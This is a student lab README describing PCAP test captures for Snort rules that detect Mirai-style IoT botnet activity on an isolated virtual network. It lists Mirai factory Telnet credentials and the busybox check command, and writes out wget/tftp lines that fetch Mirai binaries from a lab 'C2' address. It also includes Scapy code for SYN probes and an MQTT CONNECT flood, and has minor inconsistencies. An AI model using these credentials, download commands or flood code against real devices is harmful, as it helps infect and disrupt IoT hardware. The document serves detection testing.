# captures/ — PCAP Test-Case Directory

**Project:** CSL-I09 B.Tech Cyber Security Lab Mini Project  
**Title:** Snort Rules for IoT Botnet Attacks (Mirai / Bashlite family)  
**Student:** Kushal Kumar | Roll: 23ESKCY026  
**Institute:** SKIT Jaipur | Date: 2024-2025

---

## ⚠️ Ethical & Legal Disclaimer

> **These PCAP captures are strictly for EDUCATIONAL and LABORATORY use inside the SKIT Jaipur CSL-I09 lab environment.**
>
> All traffic in these files was generated inside a **closed VirtualBox host-only network** (`192.168.56.0/24`). No packets were captured from, or replayed toward, any real, production, or public-facing network or device.
>
> Distributing, replaying, or analysing these captures outside the designated lab environment may be **illegal** under the Information Technology Act 2000 (India) and equivalent legislation in other jurisdictions. The student, supervisor, and institute accept no liability for misuse.
>
> **Do not share these PCAP files externally. Do not replay them on any network you do not own and have explicit permission to test.**

---

## Directory Layout

```
captures/
├── tc01_telnet_port23_syn.pcap
├── tc02_telnet_port2323_syn.pcap
├── tc03_bruteforce_root_username.pcap
├── tc04_credential_xc3511.pcap
├── tc05_credential_vizxv.pcap
├── tc06_busybox_mirai_command.pcap
├── tc07_wget_tftp_download.pcap
├── tc08_full_attack_suite.pcap
└── README.md   ← this file
```

---

## PCAP File Descriptions

### Quick Reference Table

| File | Test Case | Simulates | Source IP | Dest IP | Port(s) | Snort SID(s) Triggered |
|------|-----------|-----------|-----------|---------|---------|------------------------|
| `tc01_telnet_port23_syn.pcap` | TC-01 | Mirai initial Telnet probe on port 23 | 192.168.56.100 | 192.168.56.10 | 23 | 1000001 |
| `tc02_telnet_port2323_syn.pcap` | TC-02 | Mirai alternate-port Telnet probe on 2323 | 192.168.56.100 | 192.168.56.10 | 2323 | 1000002 |
| `tc03_bruteforce_root_username.pcap` | TC-03 | Telnet brute-force sending username "root" | 192.168.56.100 | 192.168.56.10 | 23, 2323 | 1000003 |
| `tc04_credential_xc3511.pcap` | TC-04 | Mirai default password "xc3511" over Telnet | 192.168.56.100 | 192.168.56.10 | 23 | 1000004 |
| `tc05_credential_vizxv.pcap` | TC-05 | Mirai default password "vizxv" over Telnet | 192.168.56.100 | 192.168.56.10 | 23 | 1000005 |
| `tc06_busybox_mirai_command.pcap` | TC-06 | Post-auth "/bin/busybox MIRAI" shell command | 192.168.56.100 | 192.168.56.10 | 23 | 1000006 |
| `tc07_wget_tftp_download.pcap` | TC-07 | Payload download via wget/tftp command | 192.168.56.100 | 192.168.56.10 | 23 | 1000007 |
| `tc08_full_attack_suite.pcap` | TC-08 | Full end-to-end Mirai lifecycle + MQTT flood + SYN scan | 192.168.56.100, .105 | 192.168.56.10, .11 | Multiple | 1000001–1000010 |

---

## Detailed PCAP Descriptions

### `tc01_telnet_port23_syn.pcap`
**Simulates:** The very first packet of a Mirai scan — a raw TCP SYN to port 23.  
**Source:** `192.168.56.100` (Mirai bot node)  
**Destination:** `192.168.56.10` (IoT IP camera)  
**Ports:** TCP/23  
**Contents:** A single TCP SYN packet with no data payload. The camera's response (SYN-ACK or RST) is captured to show whether the port is open.  
**Expected Snort Alert:** SID 1000001 — *"IOT-BOTNET Telnet connection attempt to IoT device port 23"*  
**How to replay:**
```bash
tcpreplay --intf1=eth1 tc01_telnet_port23_syn.pcap
```

---

### `tc02_telnet_port2323_syn.pcap`
**Simulates:** Mirai probing the alternate Telnet port 2323 (used by many Dahua / generic OEM cameras).  
**Source:** `192.168.56.100`  
**Destination:** `192.168.56.10`  
**Ports:** TCP/2323  
**Contents:** TCP SYN on port 2323. Many consumer IP cameras open a second Telnet daemon on this port.  
**Expected Snort Alert:** SID 1000002 — *"IOT-BOTNET Mirai-style Telnet connection attempt on alt-port 2323"*

---

### `tc03_bruteforce_root_username.pcap`
**Simulates:** Mirai's credential stuffing phase — sending the string `root` as the Telnet username for dozens of credential pairs.  
**Source:** `192.168.56.100`  
**Destination:** `192.168.56.10`  
**Ports:** TCP/23, TCP/2323  
**Contents:** Multiple established Telnet sessions each containing the plaintext string `root` within the first 50 bytes of data payload. Includes Telnet option negotiation frames followed by username data.  
**Expected Snort Alert:** SID 1000003 — *"IOT-BOTNET Mirai Telnet brute-force username root detected"*

---

### `tc04_credential_xc3511.pcap`
**Simulates:** A single Mirai credential attempt using the factory-default password `xc3511` (shipped on a large batch of Chinese IP cameras).  
**Source:** `192.168.56.100`  
**Destination:** `192.168.56.10`  
**Ports:** TCP/23  
**Contents:** Established Telnet session with `root` username followed by `xc3511` password in plaintext. This is an exact reproduction of Mirai's first-priority credential entry.  
**Expected Snort Alert:** SID 1000004 — *"IOT-BOTNET Mirai factory credential attempt root:xc3511 detected"*

---

### `tc05_credential_vizxv.pcap`
**Simulates:** A Mirai credential attempt using `vizxv`, the default password for many Dahua-OEM devices.  
**Source:** `192.168.56.100`  
**Destination:** `192.168.56.10`  
**Ports:** TCP/23  
**Contents:** Established Telnet session with `root` username and `vizxv` password in plaintext.  
**Expected Snort Alert:** SID 1000005 — *"IOT-BOTNET Mirai factory credential attempt root:vizxv detected"*

---

### `tc06_busybox_mirai_command.pcap`
**Simulates:** The post-authentication phase where Mirai executes `/bin/busybox MIRAI` on the compromised camera to verify its dropped binary and kill competing bots.  
**Source:** `192.168.56.100`  
**Destination:** `192.168.56.10`  
**Ports:** TCP/23  
**Contents:** Authenticated Telnet session. After the shell prompt, the string `/bin/busybox MIRAI` is sent as a shell command within a single TCP segment, ensuring `distance:0; within:30` matches correctly.  
**Expected Snort Alert:** SID 1000006 — *"IOT-BOTNET Mirai post-auth shell command /bin/busybox MIRAI detected"*

---

### `tc07_wget_tftp_download.pcap`
**Simulates:** Mirai downloading its ARM/MIPS payload binary from a C2 server using `wget` or `tftp`.  
**Source:** `192.168.56.100`  
**Destination:** `192.168.56.10`  
**Ports:** TCP/23 (command channel), TCP/80 (simulated download)  
**Contents:** Authenticated Telnet session containing the shell command:
```
wget http://192.168.56.100/bins/mirai.arm
```
and a second variant using `tftp`:
```
tftp http://192.168.56.100/bins/mirai.mips
```
Both variants are captured to exercise the PCRE in SID 1000007.  
**Expected Snort Alert:** SID 1000007 — *"IOT-BOTNET Mirai wget or tftp payload download command detected"*

---

### `tc08_full_attack_suite.pcap`
**Simulates:** A complete end-to-end Mirai attack lifecycle against the entire lab topology, including:
1. **SYN port scan** from `192.168.56.105` hitting 25+ random ports on `.10` and `.11` within 5 seconds (triggers SID 1000008)
2. **Telnet probe** on port 23 and 2323 from `.100` → `.10` (triggers SIDs 1000001, 1000002)
3. **Credential brute-force**: root/xc3511, root/vizxv, admin/admin sequences (triggers SIDs 1000003–1000005, 1000010)
4. **Post-auth commands**: `/bin/busybox MIRAI` and `wget http://...` (triggers SIDs 1000006, 1000007)
5. **MQTT CONNECT flood**: 35 rapid CONNECT packets from `.100` to `.11:1883` (triggers SID 1000009)

**Source IPs:** `192.168.56.100`, `192.168.56.105`  
**Destination IPs:** `192.168.56.10`, `192.168.56.11`  
**Ports:** 22, 23, 80, 1883, 2323  
**Expected Snort Alerts:** All SIDs 1000001–1000010  
**Recommended for:** Full lab demonstration, final submission verification

---

## How to Open PCAPs with Wireshark

1. **Install Wireshark** (Windows): Download from [https://www.wireshark.org](https://www.wireshark.org) and install with WinPcap/Npcap.

2. **Open a capture file:**
   - Launch Wireshark → `File` → `Open` → navigate to this `captures/` folder → select a `.pcap` file.

3. **Useful display filters for this lab:**

   | Filter | Purpose |
   |--------|---------|
   | `tcp.flags.syn == 1 && tcp.flags.ack == 0` | Show only SYN packets (scanning phase) |
   | `tcp.port == 23 \|\| tcp.port == 2323` | Telnet traffic only |
   | `tcp.port == 1883` | MQTT traffic |
   | `ip.src == 192.168.56.100` | Traffic from Mirai bot node |
   | `frame contains "xc3511"` | Locate xc3511 credential packets |
   | `frame contains "vizxv"` | Locate vizxv credential packets |
   | `frame contains "busybox"` | Locate busybox MIRAI command |

4. **Follow a Telnet stream:**  
   Right-click any Telnet packet → `Follow` → `TCP Stream` to see the full plaintext Telnet session including credentials.

5. **Export filtered packets:**  
   `File` → `Export Specified Packets` → select `Displayed` to save a filtered subset.

6. **Replay PCAPs with tcpreplay (Linux lab VM):**
   ```bash
   # Install tcpreplay
   sudo apt-get install tcpreplay

   # Replay a specific test case at original speed
   sudo tcpreplay --intf1=eth1 tc01_telnet_port23_syn.pcap

   # Replay the full suite at 10× speed
   sudo tcpreplay --intf1=eth1 --multiplier=10 tc08_full_attack_suite.pcap
   ```

7. **Run Snort against a PCAP (offline analysis mode):**
   ```bash
   snort -r captures/tc08_full_attack_suite.pcap \
         -c config/snort.conf \
         -l results/ \
         -A fast
   ```

---

## Generating PCAPs in the Lab (Scapy)

If the PCAP files need to be regenerated, use Scapy on the attacker VM (`192.168.56.100`):

```python
from scapy.all import *

# TC-01: SYN to port 23
pkt = IP(src="192.168.56.100", dst="192.168.56.10") / TCP(dport=23, flags="S")
wrpcap("tc01_telnet_port23_syn.pcap", [pkt])

# TC-09: MQTT CONNECT flood (35 packets)
mqtt_connect = b"\x10\x0c\x00\x04MQTT\x04\x02\x00\x3c\x00\x00"
pkts = [IP(src="192.168.56.100", dst="192.168.56.11") /
        TCP(dport=1883) / Raw(load=mqtt_connect) for _ in range(35)]
wrpcap("tc09_mqtt_connect_flood.pcap", pkts)
```

---

*End of captures/README.md*  
*CSL-I09 | SKIT Jaipur | Kushal Kumar | 23ESKCY026*
